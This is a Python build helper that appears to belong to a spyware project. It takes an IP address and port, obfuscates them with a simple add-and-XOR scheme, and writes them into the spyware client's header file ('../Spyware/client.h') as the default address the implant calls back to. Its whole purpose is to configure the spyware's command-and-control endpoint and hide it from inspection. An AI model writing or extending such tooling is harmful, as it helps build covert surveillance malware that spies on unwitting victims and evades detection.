import argparse
from colors import *
import os

CLIENT_H_PATH = r"../Spyware/client.h"
IP_ADDRESS_STRING = "const std::string DEFAULT_IP_ADDRESS"
PORT_STRING = "const int DEFAULT_PORT"

def encrypt_ip(data):
    keyAdd = 0x0A
    keyXor = 0x0C

    result = ""
    for i in range(len(data)):
        result += chr((ord(data[i]) + keyAdd) ^ keyXor)
    return result

def encrypt_port(port):
    key = 0x1234
    port += 0x0A
    port = port ^ key
    return port

def update_client_h(ip, port):
    if not os.path.exists(CLIENT_H_PATH):
        red("client.h file not found")
        return
    
    try:
        with open(CLIENT_H_PATH, "r") as file:
            data = file.readlines()
        
        with open(CLIENT_H_PATH, "w") as file:
            for line in data:
                if IP_ADDRESS_STRING in line:
                    file.write(f'{IP_ADDRESS_STRING} = "{encrypt_ip(ip)}";\n')
                elif PORT_STRING in line:
                    file.write(f'{PORT_STRING} = {str(encrypt_port(port))};\n')
                else:
                    file.write(line)
    except:
        red("Error while updating client.h please change manually without the -c flag")
if __name__ == "__main__":    
    parser = argparse.ArgumentParser(description="Encrypt or decrypt IP and port.")
    parser.add_argument("ip", type=str, help="IP address to encrypt/decrypt")
    parser.add_argument("port", type=int, help="Port to encrypt/decrypt")
    parser.add_argument("-c", action="store_true", help="Do the changes automatically in the Server/client.h")

    args = parser.parse_args()

    if not args.c:
        green("Encrypted values\n For usage change the default DEFAULT_PORT and DEFAULT_IP in the client.h file")
        print("Encrypted IP: " + encrypt_ip(args.ip))
        print("Encrypted port: " + str(encrypt_port(args.port)))
    else:
        update_client_h(args.ip, args.port)